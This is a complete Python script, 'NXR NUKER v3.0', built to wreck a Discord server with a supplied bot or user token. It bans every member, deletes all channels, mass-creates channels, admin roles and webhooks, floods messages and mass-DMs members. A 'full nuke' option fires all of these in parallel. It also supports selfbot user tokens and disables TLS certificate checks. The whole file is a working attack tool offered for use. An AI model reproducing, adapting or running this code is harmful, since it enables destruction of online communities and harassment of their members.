#!/usr/bin/env python3
# NXR NUKER v3.0 — parallel destruction engine

import asyncio
import aiohttp
import json
import random
import string
import sys
import os
import traceback
import ssl

if sys.platform.startswith("win"):
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except Exception:
    class _D:
        def __getattr__(self, k):
            return ""
    Fore = Style = _D()
    def init(*a, **k):
        pass


BANNER = r"""
 ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗
 ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
 ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
 ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                       N X R   N U K E R   v 3 . 0
"""

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) NXR/3.0"


def pause_exit(code=0):
    print()
    print(Fore.LIGHTBLACK_EX + "[*] press ENTER to close...")
    try:
        input()
    except Exception:
        pass
    sys.exit(code)


def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def sh(s):
    """status hint"""
    if s in (200, 201, 204):
        return f"{Fore.GREEN}{s} OK"
    if s == 400:
        return f"{Fore.RED}400 BAD REQUEST"
    if s == 401:
        return f"{Fore.RED}401 UNAUTHORIZED"
    if s == 403:
        return f"{Fore.RED}403 FORBIDDEN"
    if s == 404:
        return f"{Fore.RED}404 NOT FOUND"
    if s == 429:
        return f"{Fore.YELLOW}429 RATE LIMIT"
    return f"{Fore.YELLOW}{s}"


class NXRNuker:
    def __init__(self, token, guild_id, is_bot):
        self.token = token.strip()
        self.guild_id = str(guild_id).strip()
        self.is_bot = is_bot
        prefix = "Bot " if is_bot else ""
        self.headers = {
            "Authorization": f"{prefix}{self.token}",
            "Content-Type": "application/json",
            "User-Agent": UA,
        }
        self.session = None
        self.sem = asyncio.Semaphore(50)   # aggressive concurrency
        self.ok_count = 0
        self.fail_count = 0
        self.lock = asyncio.Lock()

    async def __aenter__(self):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        connector = aiohttp.TCPConnector(ssl=ctx, limit=200, ttl_dns_cache=300)
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            timeout=aiohttp.ClientTimeout(total=20),
            connector=connector,
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def _req(self, method, path, payload=None, silent=False):
        url = API + path
        for attempt in range(5):
            async with self.sem:
                try:
                    async with self.session.request(method, url, json=payload) as r:
                        if r.status == 429:
                            try:
                                data = await r.json()
                                wait = float(data.get("retry_after", 1.0))
                            except Exception:
                                wait = 1.0
                            await asyncio.sleep(wait + 0.02)
                            continue
                        text = await r.text()
                        async with self.lock:
                            if r.status in (200, 201, 204):
                                self.ok_count += 1
                            else:
                                self.fail_count += 1
                        return r.status, text
                except Exception:
                    await asyncio.sleep(0.3)
                    continue
        async with self.lock:
            self.fail_count += 1
        return 0, "exhausted"

    # ---- diagnostics ----
    async def whoami(self):
        return await self._req("GET", "/users/@me")

    async def my_guilds(self):
        return await self._req("GET", "/users/@me/guilds")

    async def fetch_guild(self):
        s, t = await self._req("GET", f"/guilds/{self.guild_id}")
        try:
            return json.loads(t) if s == 200 else None
        except Exception:
            return None

    async def fetch_channels(self):
        s, t = await self._req("GET", f"/guilds/{self.guild_id}/channels")
        try:
            return json.loads(t) if s == 200 else []
        except Exception:
            return []

    async def fetch_members(self):
        members = []
        after = "0"
        for _ in range(50):
            s, t = await self._req(
                "GET",
                f"/guilds/{self.guild_id}/members?limit=1000&after={after}",
            )
            if s != 200:
                print(f"{Fore.YELLOW}[!] fetch_members -> {sh(s)}")
                break
            try:
                data = json.loads(t)
            except Exception:
                break
            if not isinstance(data, list) or not data:
                break
            members.extend(data)
            after = data[-1]["user"]["id"]
            if len(data) < 1000:
                break
        return members

    # ---- destruction ops ----
    async def rename_server(self, name):
        s, t = await self._req("PATCH", f"/guilds/{self.guild_id}", {"name": name})
        if s == 200:
            print(f"{Fore.GREEN}[+] RENAMED -> {name}")
        else:
            print(f"{Fore.RED}[!] rename -> {sh(s)} | {t[:120]}")

    async def delete_all_channels(self):
        chans = await self.fetch_channels()
        if not chans:
            print(f"{Fore.YELLOW}[!] no channels to delete")
            return
        print(f"{Fore.RED}[*] DELETING {len(chans)} channels...")

        async def kill(ch):
            s, _ = await self._req("DELETE", f"/channels/{ch['id']}")
            if s in (200, 204):
                print(f"{Fore.RED}[DEL-CH] {ch.get('name','?')}")

        await asyncio.gather(*[kill(c) for c in chans])

    async def ban_all(self):
        members = await self.fetch_members()
        if not members:
            print(f"{Fore.YELLOW}[!] 0 members fetched — check GUILD MEMBERS INTENT in Dev Portal")
            return
        print(f"{Fore.RED}[*] BANNING {len(members)} members...")

        async def ban_one(m):
            uid = m["user"]["id"]
            name = m["user"].get("username", "?")
            # first try with delete_message_seconds
            s, t = await self._req(
                "PUT",
                f"/guilds/{self.guild_id}/bans/{uid}",
                {"delete_message_seconds": 0},
            )
            if s == 400:
                # retry empty body
                s, t = await self._req("PUT", f"/guilds/{self.guild_id}/bans/{uid}")
            if s in (200, 201, 204):
                print(f"{Fore.RED}[BAN] {Fore.WHITE}{name} {Fore.LIGHTBLACK_EX}({uid})")
            else:
                print(f"{Fore.YELLOW}[BAN-FAIL] {name} -> {sh(s)}")

        await asyncio.gather(*[ban_one(m) for m in members])

    async def channel_spam(self, base, count):
        print(f"{Fore.MAGENTA}[*] CREATING {count} channels...")
        async def one(_):
            name = f"{base}-{rand_str(4)}" if base else f"nxr-{rand_str(5)}"
            s, _ = await self._req(
                "POST",
                f"/guilds/{self.guild_id}/channels",
                {"name": name, "type": 0},
            )
            if s in (200, 201):
                print(f"{Fore.MAGENTA}[CH] {name}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def role_spam(self, base, count):
        print(f"{Fore.RED}[*] CREATING {count} admin roles...")
        async def one(_):
            name = f"{base}-{rand_str(4)}" if base else f"nxr-{rand_str(5)}"
            payload = {
                "name": name,
                "permissions": "8",
                "color": random.randint(0, 0xFFFFFF),
                "hoist": True,
                "mentionable": True,
            }
            s, _ = await self._req(
                "POST", f"/guilds/{self.guild_id}/roles", payload
            )
            if s in (200, 201):
                print(f"{Fore.RED}[ROLE] {name}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def webhook_spam(self, base, count):
        chans = await self.fetch_channels()
        text = [c for c in chans if c.get("type") == 0]
        if not text:
            print(f"{Fore.YELLOW}[!] no text channels for webhooks")
            return
        print(f"{Fore.LIGHTCYAN_EX}[*] CREATING {count} webhooks across {len(text)} channels...")
        async def one(_):
            ch = random.choice(text)["id"]
            name = f"{base}-{rand_str(4)}" if base else f"nxr-{rand_str(5)}"
            s, _ = await self._req(
                "POST", f"/channels/{ch}/webhooks", {"name": name}
            )
            if s in (200, 201):
                print(f"{Fore.LIGHTCYAN_EX}[WH] {name}")
        await asyncio.gather(*[one(i) for i in range(count)])

    async def message_spam(self, message, count, channel_id=None):
        if not channel_id:
            chans = await self.fetch_channels()
            text = [c for c in chans if c.get("type") == 0]
            if not text:
                print(f"{Fore.YELLOW}[!] no text channels")
                return
            channel_id = text[0]["id"]
        print(f"{Fore.BLUE}[*] SPAMMING {count} msgs -> {channel_id}")
        async def one(_):
            s, _ = await self._req(
                "POST",
                f"/channels/{channel_id}/messages",
                {"content": message},
            )
        await asyncio.gather(*[one(i) for i in range(count)])

    async def dm_spam(self, message, count):
        members = await self.fetch_members()
        targets = [m for m in members if not m["user"].get("bot")]
        if not targets:
            print(f"{Fore.YELLOW}[!] no targets")
            return
        print(f"{Fore.LIGHTMAGENTA_EX}[*] DM SPAM {count}x to {len(targets)} users...")
        async def one(u):
            s, t = await self._req(
                "POST", "/users/@me/channels",
                {"recipient_id": u["user"]["id"]},
            )
            if s not in (200, 201):
                return
            try:
                ch = json.loads(t)["id"]
            except Exception:
                return
            for _ in range(count):
                await self._req(
                    "POST", f"/channels/{ch}/messages", {"content": message}
                )
            print(f"{Fore.LIGHTMAGENTA_EX}[DM] {u['user']['username']}")
        await asyncio.gather(*[one(m) for m in targets])

    async def bot_bypass_spam(self, message, per_channel):
        chans = [c for c in await self.fetch_channels() if c.get("type") == 0]
        if not chans:
            print(f"{Fore.YELLOW}[!] no channels for bypass")
            return
        print(f"{Fore.LIGHTRED_EX}[*] BYPASS {per_channel}x across {len(chans)} channels...")
        async def worker(ch):
            for _ in range(per_channel):
                await self._req(
                    "POST",
                    f"/channels/{ch['id']}/messages",
                    {"content": message, "tts": False},
                )
            print(f"{Fore.LIGHTRED_EX}[BYPASS] {ch['id']}")
        await asyncio.gather(*[worker(c) for c in chans])

    async def full_nuke(self, msg, count):
        print(f"{Fore.RED}{Style.BRIGHT}")
        print("╔══════════════════════════════════════════╗")
        print("║     NXR FULL NUKE — EVERYTHING FIRES     ║")
        print("╚══════════════════════════════════════════╝")
        t0 = asyncio.get_event_loop().time()

        # everything fires at once — max parallel
        await asyncio.gather(
            self.rename_server("NXR OWNS THIS"),
            self.ban_all(),
            self.channel_spam("nxr", count),
            self.role_spam("nxr", count),
            self.webhook_spam("nxr", count),
            self.bot_bypass_spam(msg, 5),
            return_exceptions=True,
        )

        dt = asyncio.get_event_loop().time() - t0
        print()
        print(f"{Fore.RED}{Style.BRIGHT}╔══════════════════════════════════════════╗")
        print(f"║ NUKE COMPLETE in {dt:.1f}s")
        print(f"║ OK={self.ok_count}  FAIL={self.fail_count}")
        print(f"╚══════════════════════════════════════════╝")


MENU = f"""
{Fore.LIGHTBLACK_EX}─────────────────────────────────────────────
{Fore.LIGHTMAGENTA_EX}              NXR NUKER MENU
{Fore.LIGHTBLACK_EX}─────────────────────────────────────────────
{Fore.WHITE} [1]  {Fore.RED}Ban All Members
{Fore.WHITE} [2]  {Fore.MAGENTA}Channel Create Spam
{Fore.WHITE} [3]  {Fore.BLUE}Message Spam
{Fore.WHITE} [4]  {Fore.YELLOW}Rename Server
{Fore.WHITE} [5]  {Fore.LIGHTRED_EX}Bot Bypass Spam
{Fore.WHITE} [6]  {Fore.LIGHTMAGENTA_EX}DM Spam
{Fore.WHITE} [7]  {Fore.RED}Role Spam (admin perms)
{Fore.WHITE} [8]  {Fore.LIGHTCYAN_EX}Webhook Spam
{Fore.WHITE} [9]  {Fore.RED}Delete ALL Channels
{Fore.WHITE} [10] {Fore.LIGHTRED_EX}{Style.BRIGHT}FULL NUKE (parallel, max speed)
{Fore.WHITE} [0]  {Fore.LIGHTBLACK_EX}Exit
{Fore.LIGHTBLACK_EX}─────────────────────────────────────────────
"""


def ask_int(prompt, default=500):
    try:
        v = input(prompt).strip()
        return int(v) if v else default
    except Exception:
        return default


async def preflight(n):
    print(f"{Fore.LIGHTBLACK_EX}[*] Checking token...")
    s, t = await n.whoami()
    if s != 200:
        print(f"{Fore.RED}[!] /users/@me -> {sh(s)}")
        print(f"{Fore.LIGHTBLACK_EX}    body: {t[:300]}")
        if s == 401:
            print(f"{Fore.RED}    -> token dead or wrong mode")
        return False
    try:
        me = json.loads(t)
    except Exception:
        print(f"{Fore.RED}[!] cannot parse whoami")
        return False
    uname = me.get("username", "?")
    uid = me.get("id", "?")
    is_bot_flag = me.get("bot", False)
    print(f"{Fore.GREEN}[+] Token OK -> {uname} ({uid}) bot={is_bot_flag}")

    if n.is_bot and not is_bot_flag:
        print(f"{Fore.YELLOW}[!] you picked mode 1 (bot) but token is a USER token -> pick mode 2")
    if (not n.is_bot) and is_bot_flag:
        print(f"{Fore.YELLOW}[!] you picked mode 2 (selfbot) but token is a BOT token -> pick mode 1")

    print(f"{Fore.LIGHTBLACK_EX}[*] Fetching guilds...")
    s, t = await n.my_guilds()
    if s != 200:
        print(f"{Fore.RED}[!] /users/@me/guilds -> {sh(s)}")
        return False
    try:
        guilds = json.loads(t)
    except Exception:
        print(f"{Fore.RED}[!] cannot parse guild list")
        return False
    if not guilds:
        print(f"{Fore.RED}[!] account is in ZERO servers")
        print(f"{Fore.RED}    -> invite the bot: Dev Portal -> OAuth2 -> URL Generator")
        print(f"{Fore.RED}    -> scopes: bot + applications.commands, perms: Administrator")
        return False
    ids = [str(g["id"]) for g in guilds]
    print(f"{Fore.GREEN}[+] sees {len(guilds)} server(s):")
    for g in guilds:
        mark = "  <=  TARGET" if str(g["id"]) == n.guild_id else ""
        print(f"{Fore.WHITE}      - {g.get('name','?')}  ({g.get('id','?')}){Fore.LIGHTRED_EX}{mark}")
    if n.guild_id not in ids:
        print(f"{Fore.RED}[!] server id {n.guild_id} not in the list above")
        return False

    # check admin perms on target guild
    print(f"{Fore.LIGHTBLACK_EX}[*] Verifying permissions...")
    s, t = await n._req("GET", f"/guilds/{n.guild_id}/members/@me")
    if s != 200:
        print(f"{Fore.YELLOW}[!] cannot fetch own member -> {sh(s)}")
    else:
        try:
            d = json.loads(t)
            roles = d.get("roles", [])
            print(f"{Fore.LIGHTBLACK_EX}    bot's own roles count: {len(roles)}")
        except Exception:
            pass

    s, t = await n._req(
        "POST", f"/guilds/{n.guild_id}/channels",
        {"name": f"nxr-perm-test-{rand_str(3)}", "type": 0},
    )
    if s in (200, 201):
        try:
            cid = json.loads(t)["id"]
            await n._req("DELETE", f"/channels/{cid}")
        except Exception:
            pass
        print(f"{Fore.GREEN}[+] CREATE CHANNEL works")
    else:
        print(f"{Fore.RED}[!] CREATE CHANNEL failed -> {sh(s)}")
        print(f"{Fore.RED}    -> bot lacks MANAGE_CHANNELS (grant Administrator)")

    print(f"{Fore.GREEN}[+] Ready.")
    return True


async def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.LIGHTMAGENTA_EX + BANNER)

    mode = input(f"{Fore.WHITE}[?] Mode (1=Bot / 2=Selfbot): ").strip()
    is_bot = (mode == "1")
    token = input(f"{Fore.WHITE}[?] Token: ").strip()
    if not token:
        print(f"{Fore.RED}[!] no token")
        return
    gid = input(f"{Fore.WHITE}[?] Server ID: ").strip()
    if not gid.isdigit():
        print(f"{Fore.RED}[!] Server ID must be digits")
        return

    try:
        async with NXRNuker(token, gid, is_bot) as n:
            if not await preflight(n):
                return
            while True:
                print(MENU)
                c = input(f"{Fore.LIGHTMAGENTA_EX}[nxr@root]{Fore.WHITE} ").strip()
                try:
                    if c == "1":
                        await n.ban_all()
                    elif c == "2":
                        name = input(f"{Fore.WHITE}[?] base name: ").strip() or "nxr"
                        cnt = ask_int(f"{Fore.WHITE}[?] count (500-900): ", 500)
                        await n.channel_spam(name, cnt)
                    elif c == "3":
                        msg = input(f"{Fore.WHITE}[?] message: ").strip()
                        cnt = ask_int(f"{Fore.WHITE}[?] count (500-900): ", 500)
                        ch = input(f"{Fore.WHITE}[?] channel id (blank=first): ").strip() or None
                        await n.message_spam(msg, cnt, ch)
                    elif c == "4":
                        name = input(f"{Fore.WHITE}[?] new server name: ").strip()
                        await n.rename_server(name)
                    elif c == "5":
                        msg = input(f"{Fore.WHITE}[?] bypass msg: ").strip()
                        per = ask_int(f"{Fore.WHITE}[?] per-channel (5-20): ", 10)
                        await n.bot_bypass_spam(msg, per)
                    elif c == "6":
                        msg = input(f"{Fore.WHITE}[?] dm text: ").strip()
                        cnt = ask_int(f"{Fore.WHITE}[?] count per user: ", 500)
                        await n.dm_spam(msg, cnt)
                    elif c == "7":
                        name = input(f"{Fore.WHITE}[?] role base name: ").strip() or "nxr"
                        cnt = ask_int(f"{Fore.WHITE}[?] count (500-900): ", 500)
                        await n.role_spam(name, cnt)
                    elif c == "8":
                        name = input(f"{Fore.WHITE}[?] webhook base: ").strip() or "nxr"
                        cnt = ask_int(f"{Fore.WHITE}[?] count (500-900): ", 500)
                        await n.webhook_spam(name, cnt)
                    elif c == "9":
                        await n.delete_all_channels()
                    elif c == "10":
                        msg = input(f"{Fore.WHITE}[?] spam msg: ").strip() or "NXR OWNS THIS"
                        cnt = ask_int(f"{Fore.WHITE}[?] count (500-900): ", 500)
                        await n.full_nuke(msg, cnt)
                    elif c == "0":
                        print(f"{Fore.LIGHTBLACK_EX}bye.")
                        return
                    else:
                        print(f"{Fore.RED}[!] bad choice")
                except Exception as e:
                    print(f"{Fore.RED}[!] action error: {e}")
                    traceback.print_exc()
    except Exception as e:
        print(f"{Fore.RED}[FATAL] {e}")
        traceback.print_exc()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTBLACK_EX}interrupted.")
    except Exception as e:
        print(f"{Fore.RED}[FATAL-TOP] {e}")
        traceback.print_exc()
    finally:
        pause_exit(0)
